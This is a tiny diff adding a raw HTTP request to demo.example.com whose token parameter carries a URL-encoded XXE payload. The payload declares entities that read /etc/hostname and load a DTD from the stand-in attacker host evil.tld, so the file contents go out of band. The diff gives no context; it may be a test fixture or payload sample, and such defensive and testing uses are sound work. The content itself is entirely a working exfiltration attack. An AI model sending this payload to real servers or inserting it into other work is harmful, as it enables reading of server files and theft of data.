@@ -1,0 +1,4 @@
+GET /a?token=%26lt;!DOCTYPE%20data%20[%26lt;!ENTITY%20%%20file%20SYSTEM%20%26quot;file:///etc/hostname%26quot;%26gt;%26lt;!ENTITY%20%%20dtd%20SYSTEM%20%26quot;http://evil.tld/oob.dtd%26quot;%26gt;%dtd;]%26gt;%26lt;r/%26gt; HTTP/1.1
+Host: demo.example.com
+Connection: close
+
